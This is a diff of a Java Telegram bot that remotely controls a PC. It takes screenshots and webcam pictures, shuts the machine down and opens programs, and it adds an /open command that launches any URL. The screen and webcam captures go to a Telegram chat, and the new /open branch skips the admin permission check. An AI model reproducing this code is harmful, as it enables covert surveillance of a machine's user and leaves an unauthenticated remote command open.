@@ -5,11 +5,15 @@ import org.telegram.telegrambots.meta.api.objects.InputFile;
 import org.telegram.telegrambots.meta.api.objects.Update;
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
 
+import java.awt.*;
 import java.io.File;
 import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.util.Map;
 
 public class Hello extends TelegramLongPollingBot {
+
 
     private static final String ADMIN = "5401328104";
 
@@ -28,10 +32,11 @@ public class Hello extends TelegramLongPollingBot {
         String command = update.getMessage().getText();
         command.toLowerCase();
 
-        if (command.equals("/run") || command.equals("/start") || command.equals("/menu") || command.startsWith("/open")
-        ) {
+
+        if (command.equals("/run") || command.equals("/start") || command.equals("/menu"))
+         {
             SendMessage response = new SendMessage();
-            String message = "Hello do you want /screen /webcam /offpc /notepad ?";
+            String message = "Hello do you want /screen /webcam /offpc /notepad /open https://site.com ?";
             response.setChatId(update.getMessage().getChatId().toString());
             response.setText(message);
             try {
@@ -40,6 +45,16 @@ public class Hello extends TelegramLongPollingBot {
                 e.printStackTrace();
             }
 
+        } else if(command.startsWith("/open")) {
+            String[] commandArray = command.split(" ");
+            Desktop desktop = Desktop.getDesktop();
+            try {
+                desktop.browse(new URI(commandArray[1]));
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (URISyntaxException e) {
+                e.printStackTrace();
+            }
         } else {
             try {
                 SendMessage response = new SendMessage();
@@ -48,10 +63,7 @@ public class Hello extends TelegramLongPollingBot {
 
                 InputFile file;
                 Map<String, String> map = System.getenv();
-
-
                 switch (command) {
-
                     case "/screen":
                         if (response.getChatId().equals(ADMIN)) {
                             photo.setChatId(update.getMessage().getChatId().toString());
@@ -61,16 +73,17 @@ public class Hello extends TelegramLongPollingBot {
                             System.out.println("Хочу достать из: " + file.getAttachName());
                             photo.setPhoto(file);
                             response.setChatId(update.getMessage().getChatId().toString());
-                            response.setText("Screen dekstop from PC: " + map.get("USERNAME"));
+                            response.setText("Screen desktop from PC: " + map.get("USERNAME"));
                             execute(response);
                             execute(photo);
-                        }
-                        else {
+                        } else {
                             response.setText("You not have permission by this bot");
                             execute(response);
                         }
                         break;
+
                     case "/webcam":
+
                         if (response.getChatId().equals(ADMIN)) {
                             photo.setChatId(update.getMessage().getChatId().toString());
                             Starter.callCam();
@@ -81,18 +94,21 @@ public class Hello extends TelegramLongPollingBot {
                             response.setText("Webcam dekstop from PC: " + map.get("USERNAME"));
                             execute(response);
                             execute(photo);
-                        }
-                        else {
+                        } else {
                             response.setText("You not have permission by this bot");
                             execute(response);
                         }
                         break;
+
                     case "/offpc":
+
                         if (response.getChatId().equals(ADMIN)) {
                             offPc();
-                        }else{
+                        } else {
                             response.setText("You not have permission by this bot");
-                        execute(response);}
+                        execute(response);
+                        }
+
                         break;
                     case "/notepad":
                         if (response.getChatId().equals(ADMIN)) {
@@ -103,9 +119,11 @@ public class Hello extends TelegramLongPollingBot {
                             catch (IOException e) {
                                 System.out.println(e);
                             }
-                        }else{
+                        } else {
                             response.setText("You not have permission by this bot");
-                            execute(response);}
+                            execute(response);
+                        }
+
                         break;
                     default:
                         response.setText("Bad command");
@@ -115,6 +133,8 @@ public class Hello extends TelegramLongPollingBot {
 
                 }
             }
+
+
         }
 
 
